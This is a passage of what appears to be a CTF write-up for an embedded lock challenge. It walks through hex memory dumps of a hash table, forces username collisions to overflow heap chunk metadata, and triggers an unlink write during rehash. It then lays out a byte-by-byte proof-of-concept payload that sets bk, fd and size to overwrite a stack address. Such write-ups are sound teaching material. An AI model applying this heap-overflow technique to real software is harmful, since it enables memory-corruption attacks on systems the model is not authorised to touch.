5150: <mark>0000 0000 0000 0000 0000 0000</mark> fc50 bc51   .............P.Q
5160: b500 7573 6572 3800 0000 0000 0000 0000   ..user8.........
5170: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5180: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5190: *  
51b0: 0000 0000 0000 0000 0000 0000 5c51 1c52   ............\Q.R
51c0: b500 7573 6572 3700 0000 0000 0000 0000   ..user7.........
51d0: 0000 e803 0000 0000 0000 0000 0000 0000   ................
51e0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
51f0: *  
5210: 0000 0000 0000 0000 0000 0000 bc51 7c52   .............Q|R
5220: b500 7573 6572 3600 0000 0000 0000 0000   ..user6.........
5230: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5240: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5250: *  
5270: 0000 0000 0000 0000 0000 0000 1c52 dc52   .............R.R
5280: b500 7573 6572 3500 0000 0000 0000 0000   ..user5.........
5290: 0000 e803 7573 6572 3130 0000 0000 0000   ....user10......
52a0: 0000 0000 e803 0000 0000 0000 0000 0000   ................
52b0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
52c0: *  
52d0: 0000 0000 0000 0000 0000 0000 7c52 3c53   ............|R&lt;S
52e0: b500 7573 6572 3400 0000 0000 0000 0000   ..user4.........
52f0: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5300: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5310: *  
5330: 0000 0000 0000 0000 0000 0000 dc52 0050   .............R.P
5340: 7cf9 0000 0000 0000 0000 0000 0000 0000   |...............
5350: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5360: *  
</code></pre>
  </section>
  <section id="hash-bucket-3">

	  <h5>Hash Bucket 3</h5>

<pre><code>&gt;&gt;&gt; hash_username(binascii.hexlify(b'user8')) % 8
<mark>3</mark>
</code></pre>

<pre><code>5000: 0050 1050 1500 0a00 0300 0500 1650 2c50   .P.P.........P,P
5010: 0050 2650 2100 4250 a250 0251 6251 c251   .P&amp;P!.BP.P.QbQ.Q
5020: 2252 8252 e252 1050 3c50 2100 0100 0100   &quot;R.R.R.P&lt;P!.....
5030: 0200 0100 0100 0100 0200 0100 2650 9c50   ............&amp;P.P
5040: b500 7573 6572 3300 0000 0000 0000 0000   ..user3.........
5050: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5060: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5070: *  
5090: 0000 0000 0000 0000 0000 0000 3c50 fc50   ............&lt;P.P
50a0: b500 7573 6572 3200 0000 0000 0000 0000   ..user2.........
50b0: 0000 e803 0000 0000 0000 0000 0000 0000   ................
50c0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
50d0: *  
50f0: 0000 0000 0000 0000 0000 0000 9c50 5c51   .............P\Q
5100: b500 7573 6572 3100 0000 0000 0000 0000   ..user1.........
5110: 0000 e803 7573 6572 3900 0000 0000 0000   ....user9.......
5120: 0000 0000 e803 0000 0000 0000 0000 0000   ................
5130: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5140: *  
5150: 0000 0000 0000 0000 0000 0000 fc50 bc51   .............P.Q
5160: b500 <mark>7573 6572 3800 0000 0000 0000 0000</mark>   ..user8.........
5170: <mark>0000 e803 0000 0000 0000 0000 0000 0000</mark>   ................
5180: <mark>0000 0000 0000 0000 0000 0000 0000 0000</mark>   ................
5190: *  
51b0: <mark>0000 0000 0000 0000 0000 0000</mark> 5c51 1c52   ............\Q.R
51c0: b500 7573 6572 3700 0000 0000 0000 0000   ..user7.........
51d0: 0000 e803 0000 0000 0000 0000 0000 0000   ................
51e0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
51f0: *  
5210: 0000 0000 0000 0000 0000 0000 bc51 7c52   .............Q|R
5220: b500 7573 6572 3600 0000 0000 0000 0000   ..user6.........
5230: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5240: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5250: *  
5270: 0000 0000 0000 0000 0000 0000 1c52 dc52   .............R.R
5280: b500 7573 6572 3500 0000 0000 0000 0000   ..user5.........
5290: 0000 e803 7573 6572 3130 0000 0000 0000   ....user10......
52a0: 0000 0000 e803 0000 0000 0000 0000 0000   ................
52b0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
52c0: *  
52d0: 0000 0000 0000 0000 0000 0000 7c52 3c53   ............|R&lt;S
52e0: b500 7573 6572 3400 0000 0000 0000 0000   ..user4.........
52f0: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5300: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5310: *  
5330: 0000 0000 0000 0000 0000 0000 dc52 0050   .............R.P
5340: 7cf9 0000 0000 0000 0000 0000 0000 0000   |...............
5350: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5360: *  
</code></pre>
  </section>
  <section id="hash-bucket-4">

	  <h5>Hash Bucket 4</h5>

<pre><code>&gt;&gt;&gt; hash_username(binascii.hexlify(b'user7')) % 8
<mark>4</mark>
</code></pre>

<pre><code>5000: 0050 1050 1500 0a00 0300 0500 1650 2c50   .P.P.........P,P
5010: 0050 2650 2100 4250 a250 0251 6251 c251   .P&amp;P!.BP.P.QbQ.Q
5020: 2252 8252 e252 1050 3c50 2100 0100 0100   &quot;R.R.R.P&lt;P!.....
5030: 0200 0100 0100 0100 0200 0100 2650 9c50   ............&amp;P.P
5040: b500 7573 6572 3300 0000 0000 0000 0000   ..user3.........
5050: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5060: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5070: *  
5090: 0000 0000 0000 0000 0000 0000 3c50 fc50   ............&lt;P.P
50a0: b500 7573 6572 3200 0000 0000 0000 0000   ..user2.........
50b0: 0000 e803 0000 0000 0000 0000 0000 0000   ................
50c0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
50d0: *  
50f0: 0000 0000 0000 0000 0000 0000 9c50 5c51   .............P\Q
5100: b500 7573 6572 3100 0000 0000 0000 0000   ..user1.........
5110: 0000 e803 7573 6572 3900 0000 0000 0000   ....user9.......
5120: 0000 0000 e803 0000 0000 0000 0000 0000   ................
5130: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5140: *  
5150: 0000 0000 0000 0000 0000 0000 fc50 bc51   .............P.Q
5160: b500 7573 6572 3800 0000 0000 0000 0000   ..user8.........
5170: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5180: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5190: *  
51b0: 0000 0000 0000 0000 0000 0000 5c51 1c52   ............\Q.R
51c0: b500 <mark>7573 6572 3700 0000 0000 0000 0000</mark>   ..user7.........
51d0: <mark>0000 e803 0000 0000 0000 0000 0000 0000</mark>   ................
51e0: <mark>0000 0000 0000 0000 0000 0000 0000 0000</mark>   ................
51f0: *  
5210: <mark>0000 0000 0000 0000 0000 0000</mark> bc51 7c52   .............Q|R
5220: b500 7573 6572 3600 0000 0000 0000 0000   ..user6.........
5230: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5240: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5250: *  
5270: 0000 0000 0000 0000 0000 0000 1c52 dc52   .............R.R
5280: b500 7573 6572 3500 0000 0000 0000 0000   ..user5.........
5290: 0000 e803 7573 6572 3130 0000 0000 0000   ....user10......
52a0: 0000 0000 e803 0000 0000 0000 0000 0000   ................
52b0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
52c0: *  
52d0: 0000 0000 0000 0000 0000 0000 7c52 3c53   ............|R&lt;S
52e0: b500 7573 6572 3400 0000 0000 0000 0000   ..user4.........
52f0: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5300: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5310: *  
5330: 0000 0000 0000 0000 0000 0000 dc52 0050   .............R.P
5340: 7cf9 0000 0000 0000 0000 0000 0000 0000   |...............
5350: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5360: *  
</code></pre>
  </section>
  <section id="hash-bucket-5">

	  <h5>Hash Bucket 5</h5>

<pre><code>&gt;&gt;&gt; hash_username(binascii.hexlify(b'user6')) % 8
<mark>5</mark>
</code></pre>

<pre><code>5000: 0050 1050 1500 0a00 0300 0500 1650 2c50   .P.P.........P,P
5010: 0050 2650 2100 4250 a250 0251 6251 c251   .P&amp;P!.BP.P.QbQ.Q
5020: 2252 8252 e252 1050 3c50 2100 0100 0100   &quot;R.R.R.P&lt;P!.....
5030: 0200 0100 0100 0100 0200 0100 2650 9c50   ............&amp;P.P
5040: b500 7573 6572 3300 0000 0000 0000 0000   ..user3.........
5050: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5060: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5070: *  
5090: 0000 0000 0000 0000 0000 0000 3c50 fc50   ............&lt;P.P
50a0: b500 7573 6572 3200 0000 0000 0000 0000   ..user2.........
50b0: 0000 e803 0000 0000 0000 0000 0000 0000   ................
50c0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
50d0: *  
50f0: 0000 0000 0000 0000 0000 0000 9c50 5c51   .............P\Q
5100: b500 7573 6572 3100 0000 0000 0000 0000   ..user1.........
5110: 0000 e803 7573 6572 3900 0000 0000 0000   ....user9.......
5120: 0000 0000 e803 0000 0000 0000 0000 0000   ................
5130: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5140: *  
5150: 0000 0000 0000 0000 0000 0000 fc50 bc51   .............P.Q
5160: b500 7573 6572 3800 0000 0000 0000 0000   ..user8.........
5170: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5180: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5190: *  
51b0: 0000 0000 0000 0000 0000 0000 5c51 1c52   ............\Q.R
51c0: b500 7573 6572 3700 0000 0000 0000 0000   ..user7.........
51d0: 0000 e803 0000 0000 0000 0000 0000 0000   ................
51e0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
51f0: *  
5210: 0000 0000 0000 0000 0000 0000 bc51 7c52   .............Q|R
5220: b500 <mark>7573 6572 3600 0000 0000 0000 0000</mark>   ..user6.........
5230: <mark>0000 e803 0000 0000 0000 0000 0000 0000</mark>   ................
5240: <mark>0000 0000 0000 0000 0000 0000 0000 0000</mark>   ................
5250: *  
5270: <mark>0000 0000 0000 0000 0000 0000</mark> 1c52 dc52   .............R.R
5280: b500 7573 6572 3500 0000 0000 0000 0000   ..user5.........
5290: 0000 e803 7573 6572 3130 0000 0000 0000   ....user10......
52a0: 0000 0000 e803 0000 0000 0000 0000 0000   ................
52b0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
52c0: *  
52d0: 0000 0000 0000 0000 0000 0000 7c52 3c53   ............|R&lt;S
52e0: b500 7573 6572 3400 0000 0000 0000 0000   ..user4.........
52f0: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5300: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5310: *  
5330: 0000 0000 0000 0000 0000 0000 dc52 0050   .............R.P
5340: 7cf9 0000 0000 0000 0000 0000 0000 0000   |...............
5350: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5360: *  
</code></pre>
  </section>
  <section id="hash-bucket-6">

	  <h5>Hash Bucket 6</h5>

<pre><code>&gt;&gt;&gt; hash_username(binascii.hexlify(b'user5')) % 8
<mark>6</mark>
&gt;&gt;&gt; hash_username(binascii.hexlify(b'user10')) % 8
<mark>6</mark>
</code></pre>

<pre><code>5000: 0050 1050 1500 0a00 0300 0500 1650 2c50   .P.P.........P,P
5010: 0050 2650 2100 4250 a250 0251 6251 c251   .P&amp;P!.BP.P.QbQ.Q
5020: 2252 8252 e252 1050 3c50 2100 0100 0100   &quot;R.R.R.P&lt;P!.....
5030: 0200 0100 0100 0100 0200 0100 2650 9c50   ............&amp;P.P
5040: b500 7573 6572 3300 0000 0000 0000 0000   ..user3.........
5050: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5060: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5070: *  
5090: 0000 0000 0000 0000 0000 0000 3c50 fc50   ............&lt;P.P
50a0: b500 7573 6572 3200 0000 0000 0000 0000   ..user2.........
50b0: 0000 e803 0000 0000 0000 0000 0000 0000   ................
50c0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
50d0: *  
50f0: 0000 0000 0000 0000 0000 0000 9c50 5c51   .............P\Q
5100: b500 7573 6572 3100 0000 0000 0000 0000   ..user1.........
5110: 0000 e803 7573 6572 3900 0000 0000 0000   ....user9.......
5120: 0000 0000 e803 0000 0000 0000 0000 0000   ................
5130: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5140: *  
5150: 0000 0000 0000 0000 0000 0000 fc50 bc51   .............P.Q
5160: b500 7573 6572 3800 0000 0000 0000 0000   ..user8.........
5170: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5180: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5190: *  
51b0: 0000 0000 0000 0000 0000 0000 5c51 1c52   ............\Q.R
51c0: b500 7573 6572 3700 0000 0000 0000 0000   ..user7.........
51d0: 0000 e803 0000 0000 0000 0000 0000 0000   ................
51e0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
51f0: *  
5210: 0000 0000 0000 0000 0000 0000 bc51 7c52   .............Q|R
5220: b500 7573 6572 3600 0000 0000 0000 0000   ..user6.........
5230: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5240: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5250: *  
5270: 0000 0000 0000 0000 0000 0000 1c52 dc52   .............R.R
5280: b500 <mark>7573 6572 3500 0000 0000 0000 0000</mark>   ..user5.........
5290: <mark>0000 e803 7573 6572 3130 0000 0000 0000</mark>   ....user10......
52a0: <mark>0000 0000 e803 0000 0000 0000 0000 0000</mark>   ................
52b0: <mark>0000 0000 0000 0000 0000 0000 0000 0000</mark>   ................
52c0: *  
52d0: <mark>0000 0000 0000 0000 0000 0000</mark> 7c52 3c53   ............|R&lt;S
52e0: b500 7573 6572 3400 0000 0000 0000 0000   ..user4.........
52f0: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5300: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5310: *  
5330: 0000 0000 0000 0000 0000 0000 dc52 0050   .............R.P
5340: 7cf9 0000 0000 0000 0000 0000 0000 0000   |...............
5350: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5360: *  
</code></pre>
  </section>
  <section id="hash-bucket-7">

	  <h5>Hash Bucket 7</h5>

<pre><code>&gt;&gt;&gt; hash_username(binascii.hexlify(b'user4')) % 8
<mark>7</mark>
</code></pre>

<pre><code>5000: 0050 1050 1500 0a00 0300 0500 1650 2c50   .P.P.........P,P
5010: 0050 2650 2100 4250 a250 0251 6251 c251   .P&amp;P!.BP.P.QbQ.Q
5020: 2252 8252 e252 1050 3c50 2100 0100 0100   &quot;R.R.R.P&lt;P!.....
5030: 0200 0100 0100 0100 0200 0100 2650 9c50   ............&amp;P.P
5040: b500 7573 6572 3300 0000 0000 0000 0000   ..user3.........
5050: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5060: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5070: *  
5090: 0000 0000 0000 0000 0000 0000 3c50 fc50   ............&lt;P.P
50a0: b500 7573 6572 3200 0000 0000 0000 0000   ..user2.........
50b0: 0000 e803 0000 0000 0000 0000 0000 0000   ................
50c0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
50d0: *  
50f0: 0000 0000 0000 0000 0000 0000 9c50 5c51   .............P\Q
5100: b500 7573 6572 3100 0000 0000 0000 0000   ..user1.........
5110: 0000 e803 7573 6572 3900 0000 0000 0000   ....user9.......
5120: 0000 0000 e803 0000 0000 0000 0000 0000   ................
5130: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5140: *  
5150: 0000 0000 0000 0000 0000 0000 fc50 bc51   .............P.Q
5160: b500 7573 6572 3800 0000 0000 0000 0000   ..user8.........
5170: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5180: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5190: *  
51b0: 0000 0000 0000 0000 0000 0000 5c51 1c52   ............\Q.R
51c0: b500 7573 6572 3700 0000 0000 0000 0000   ..user7.........
51d0: 0000 e803 0000 0000 0000 0000 0000 0000   ................
51e0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
51f0: *  
5210: 0000 0000 0000 0000 0000 0000 bc51 7c52   .............Q|R
5220: b500 7573 6572 3600 0000 0000 0000 0000   ..user6.........
5230: 0000 e803 0000 0000 0000 0000 0000 0000   ................
5240: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5250: *  
5270: 0000 0000 0000 0000 0000 0000 1c52 dc52   .............R.R
5280: b500 7573 6572 3500 0000 0000 0000 0000   ..user5.........
5290: 0000 e803 7573 6572 3130 0000 0000 0000   ....user10......
52a0: 0000 0000 e803 0000 0000 0000 0000 0000   ................
52b0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
52c0: *  
52d0: 0000 0000 0000 0000 0000 0000 7c52 3c53   ............|R&lt;S
52e0: b500 <mark>7573 6572 3400 0000 0000 0000 0000</mark>   ..user4.........
52f0: <mark>0000 e803 0000 0000 0000 0000 0000 0000</mark>   ................
5300: <mark>0000 0000 0000 0000 0000 0000 0000 0000</mark>   ................
5310: *  
5330: <mark>0000 0000 0000 0000 0000 0000</mark> dc52 0050   .............R.P
5340: 7cf9 0000 0000 0000 0000 0000 0000 0000   |...............
5350: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5360: *  
</code></pre>
  </section>
</div>

<h3>Data Structure Analysis</h3>
<p>Consider the following section of memory. Each username resides in a fixed-length sixteen-byte buffer.</p>

<pre><code>50f0: 0000 0000 0000 0000 0000 0000 9c50 5c51   .............P\Q
5100: b500 <mark>7573 6572 3100 0000 0000 0000 0000</mark>   ..user1.........
5110: <mark>0000</mark> e803 7573 6572 3900 0000 0000 0000   ....user9.......
5120: 0000 0000 e803 0000 0000 0000 0000 0000   ................
5130: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5140: *  
</code></pre>

<p>Aside from the username, the following data is also visible.</p>

<pre><code>50f0: 0000 0000 0000 0000 0000 0000 9c50 5c51   .............P\Q
5100: b500 7573 6572 3100 0000 0000 0000 0000   ..user1.........
5110: 0000 <mark>e803</mark> 7573 6572 3900 0000 0000 0000   ....user9.......
5120: 0000 0000 e803 0000 0000 0000 0000 0000   ................
5130: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5140: *  
</code></pre>

<p>The value <code>0xe803</code> is an integer equal to decimal 1000 after reversing the endianness and converting from hex, which matches the pin supplied earlier.</p>

<pre><code>$ python3 -c "import binascii; value = '<mark>e803</mark>'; print(int(binascii.hexlify(binascii.unhexlify(value)[::-1]).decode(), 16))"
<mark>1000</mark>
</code></pre>

<p>Last, there is the metadata for the heap chunk containing the hash bucket, visible just before the first username string.</p>

<pre><code>50f0: 0000 0000 0000 0000 0000 0000 <mark>9c50 5c51</mark>   .............P\Q
5100: <mark>b500</mark> 7573 6572 3100 0000 0000 0000 0000   ..user1.........
5110: 0000 e803 7573 6572 3900 0000 0000 0000   ....user9.......
5120: 0000 0000 e803 0000 0000 0000 0000 0000   ................
5130: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5140: *  
</code></pre>

<p>In order, these three words are:</p>

<ol>
	<li><code>bk</code> (the back pointer for the current heap chunk)</li>
	<li><code>fd</code> (the forward pointer for the current heap chunk)</li>
	<li><code>size</code> (for the current heap chunk).</li>
	</ol>

	<p>Unlike on GLIBC, these words are present regardless of the chunk's allocation status and are not stored inline, necessitating an actual heap overflow rather than just a use-after-free.</p>

<h2>Vulnerability Analysis</h2>

<p>Each account occupies 18 bytes of memory—counting the additional two bytes for the pin. The copy operation truncates usernames longer than fifteen bytes, so submitting an arbitrarily long one to overflow the heap metadata for the next chunk is impossible.</p>

<p>It is, however, possible to craft inputs such that all accounts end up in the same hash bucket. Each heap chunk is 90 bytes long. After five accounts, the username for the sixth will overlap the metadata for the subsequent heap chunk.</p>

<h5>Input:</h5>
<pre><code>new user05 0002;new user16 0002;new user27 0002;new user38 0002;new user49 0002;new <mark>bbbbbbbbbbbbbbbb</mark> 0002</code></pre>

<h5>Output:</h5>
<pre><code>Adding user account user05 with pin 0002.
Adding user account user16 with pin 0002.
Adding user account user27 with pin 0002.
Adding user account user38 with pin 0002.
Adding user account user49 with pin 0002.
Adding user account <mark>bbbbbbbbbbbbbbbb</mark> with pin 0002.
</code></pre>

<h5>Memory:</h5>

<div id="slides">
  <section id="memory-before-overflow">
<pre><code>5000: 0050 1050 1500 0000 0300 0500 1650 2c50   .P.P.........P,P
5010: 0050 2650 2100 4250 a250 0251 6251 c251   .P&amp;P!.BP.P.QbQ.Q
5020: 2252 8252 e252 1050 3c50 2100 0000 0000   &quot;R.R.R.P&lt;P!.....
5030: 0000 0000 0000 0000 0000 0000 2650 9c50   ............&amp;P.P
5040: b500 0000 0000 0000 0000 0000 0000 0000   ................
5050: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5060: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5070: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5080: 0000 0000 0000 0000 0000 0000 0000 0000   ................
5090: 0000 0000 0000 0000 0000 0000 <mark>3c50 fc50</mark>   ............&lt;P.P
50a0: <mark>b500</mark> 0000 0000 0000 0000 0000 0000 0000   ................
50b0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
50c0: *  </code></pre>
  </section>
  <section id="memory-after-overflow">
<pre><code>5000: 0050 1050 1500 0600 0300 0500 1650 2c50   .P.P.........P,P
5010: 0050 2650 2100 4250 a250 0251 6251 c251   .P&amp;P!.BP.P.QbQ.Q
5020: 2252 8252 e252 1050 3c50 2100 0600 0000   &quot;R.R.R.P&lt;P!.....
5030: 0000 0000 0000 0000 0000 0000 2650 9c50   ............&amp;P.P
5040: b500 7573 6572 3035 0000 0000 0000 0000   ..user05........
5050: 0000 0200 7573 6572 3136 0000 0000 0000   ....user16......
5060: 0000 0000 0200 7573 6572 3237 0000 0000   ......user27....
5070: 0000 0000 0000 0200 7573 6572 3338 0000   ........user38..
5080: 0000 0000 0000 0000 0200 7573 6572 3439   ..........user49
5090: 0000 0000 0000 0000 0000 0200 <mark>6262 6262</mark>   ............bbbb
50a0: <mark>6262 6262 6262 6262 6262 6200</mark> 0200 0000   bbbbbbbbbbb.....
50b0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
50c0: *  </code></pre>
  </section>
</div>

<ul id="nav">
  <li><a href="#memory-before-overflow">Memory Before Overflow</a></li>
  <li><a href="#memory-after-overflow">Memory After Overflow</a></li>
</ul>

<p>The <code>fd</code> and <code>bk</code> pointers both point to address <code>0x6262</code>. This heap overflow allows corrupting the metadata for the next chunk and the nine succeeding bytes.</p>

<h3>Triggering The Unlink</h3>

<p>There must be a way to free the heap chunk at address <code>0x509c</code> for this vulnerability to be exploitable.</p>

<h4>Rehash Function</h4>

<p>Adding 12 user accounts results in a call to the <code>rehash</code> function, which performs the following operations.</p>

<ol>
	<li>Allocate sixteen new heap chunks for a new sixteen-bucket hash table.</li>
	<li>Traverse the existing hash table and calculate which new buckets should store the existing usernames.</li>
	<li>Copy the usernames to their respective buckets in the new table.</li>
	<li>Free the old table.</li>
</ol>

<p>Crucially, the last step should free the overflowed chunk and trigger the arbitrary write. Adding the first six accounts is necessary to cause the overflow, so adding another six will trigger this behavior.</p>

<h5>Additional Input:</h5>
<pre><code>new user1 0002;new user2 0002;new user3 0002;new user4 0002;new user5 0002;new user6 0002</code></pre>

<h5>Additional Output:</h5>
<pre><code>Adding user account user1 with pin 0002.
Adding user account user2 with pin 0002.
Adding user account user3 with pin 0002.
Adding user account user4 with pin 0002.
Adding user account user5 with pin 0002.
Adding user account user6 with pin 0002.</code></pre>

<p>The implementation dereferences the corrupted back pointer (<code>bk</code>) and writes data near address <code>0x6262</code>, demonstrating that the bug is exploitable.</p>


<pre><code>6260: 0000 <mark>0000 c250 4600</mark> 0000 0000 0000 0000   .....PF.........
6270: 0000 0000 0000 0000 0000 0000 0000 0000   ................
6280: *  
</code></pre>

<h2>Exploit Development</h2>

<p>In theory, this means it is possible to overwrite a return address. Consider the following proof of concept.</p>

</code></pre>
<pre><code class='language-ascii-noshadows'>                                     ┌─────────┬─────────┐     
                                     │COLLISION│PIN      │     
                                     │BYTE     │DELIMITER│     
                                     └──────┐  │  ┌──────┘     
                                            │  │  │            
              ┌───────────┬─────┬─────┬─────┤  │  │            
              │COMMAND    │BK   │FD   │SIZE │  │  │            
┌───────┬─────┼───────────┼─────┼─────┼─────┼──┼──┼───────────┐
│       │HEX  │6e 65 77 20│<mark>ca fe│30 30│ff ff│74</mark>│20│<mark>30 30 30 32</mark>│
│EXPLOIT├─────┼──┬──┬──┬──┼──┬──┼──┬──┼──┬──┼──┼──┼──┬──┬──┬──┤
│       │ASCII│n │e │w │  │  │  │0 │0 │  │  │t │  │0 │0 │0 │2 │
└───────┴─────┴──┴──┴──┴──┼──┴──┴──┴──┴──┴──┴──┼──┼──┴──┴──┴──┤
			  │<mark>USERNAME</mark>            │  │<mark>PIN</mark>        │
                          └────────────────────┘  └───────────┘
</code></pre>

<p>After adding five accounts to hash bucket zero, the username in the above command will overflow the heap metadata for the chunk containing hash bucket 1.</p> 

<br>

<div id="slides">
  <section id="memory-before-poc-overflow">
<pre><code>5090: 0000 0000 0000 0000 0000 0200 <mark>3c50 fc50</mark>   ............&lt;P.P
50a0: <mark>b500</mark> 0000 0000 0000 0000 0000 0000 0000   ................
50b0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
50c0: *  </code></pre>
  </section>
  <section id="memory-after-poc-overflow">
<pre><code>5090: 0000 0000 0000 0000 0000 0200 <mark>cafe 3030</mark>   ..............00
50a0: <mark>ffff 74</mark>00 0000 0000 0000 0000 0200 0000   ..t.............
50b0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
50c0: *  
</code></pre>
  </section>
</div>

<ul id="nav">
  <li><a href="#memory-before-poc-overflow">Memory Before Overflow</a></li>
  <li><a href="#memory-after-poc-overflow">Memory After Overflow</a></li>
</ul>

<h3>Breakdown</h3>

<p><b>Pin delimiter:</b> the first space or null signals the start of the pin.</p>

<pre><code class='language-ascii-noshadows'>┌───────┬─────┬───────────────────────────────────────────────┐
│       │HEX  │6e 65 77 20 ca fe 30 30 ff ff 74 <mark>20</mark> 30 30 30 32│
│EXPLOIT├─────┼──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┤
│       │ASCII│n │e │w │  │  │  │0 │0 │  │  │t │  │0 │0 │0 │2 │
└───────┴─────┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┘
</code></pre>

<p><b>Back pointer:</b> the <code>bk</code> pointer should be set to the value to write. The <code>free</code> function will attempt to dereference this as a pointer, so it must be even. Setting it to a recognizable dummy value is sufficient for testing purposes.</p>

<pre><code class='language-ascii-noshadows'>┌───────┬─────┬───────────────────────────────────────────────┐
│       │HEX  │6e 65 77 20 <mark>ca fe</mark> 30 30 ff ff 74 20 30 30 30 32</mark>│
│EXPLOIT├─────┼──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┤
│       │ASCII│n │e │w │  │  │  │0 │0 │  │  │t │  │0 │0 │0 │2 │
└───────┴─────┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┘
</code></pre>

<pre><code>5090: 0000 0000 0000 0000 0000 0200 <mark>cafe</mark> 3030   ..............00
50a0: ffff 7400 0000 0000 0000 0000 0200 0000   ..t.............
50b0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
50c0: *  
</code></pre>

<p><b>Forward pointer:</b> set the <code>fd</code> pointer to the target address at which to write the dummy value. The stack is in the <code>0x3000-0x4000</code> address range, so <code>fd</code> is set to <code>0x3030</code> for testing purposes.</p>

<pre><code class='language-ascii-noshadows'>┌───────┬─────┬───────────────────────────────────────────────┐
│       │HEX  │6e 65 77 20 ca fe <mark>30 30</mark> ff ff 74 20 30 30 30 32│
│EXPLOIT├─────┼──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┤
│       │ASCII│n │e │w │  │  │  │0 │0 │  │  │t │  │0 │0 │0 │2 │
└───────┴─────┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┘
</code></pre>

<pre><code>5090: 0000 0000 0000 0000 0000 0200 cafe <mark>3030</mark>   ..............00
50a0: ffff 7400 0000 0000 0000 0000 0200 0000   ..t.............
50b0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
50c0: *  
</code></pre>

<p><b>Size:</b> changing the size field is not essential, and leaving it unaltered as <code>0xB500</code> is preferable. The issue is that the bytes <code>0x00</code> and <code>0x20</code> (nulls and spaces) delimit the beginning of the pin. Because the size field is before the pin, it cannot have either of these characters in it. The size is set to <code>0xFFFF</code> to satisfy this constraint.</p>

<pre><code class='language-ascii-noshadows'>┌───────┬─────┬───────────────────────────────────────────────┐
│       │HEX  │6e 65 77 20 ca fe 30 30 <mark>ff ff</mark> 74 20 30 30 30 32│
│EXPLOIT├─────┼──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┬──┤
│       │ASCII│n │e │w │  │  │  │0 │0 │  │  │t │  │0 │0 │0 │2 │
└───────┴─────┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┴──┘
</code></pre>

<pre><code>5090: 0000 0000 0000 0000 0000 0200 cafe 3030   ..............00
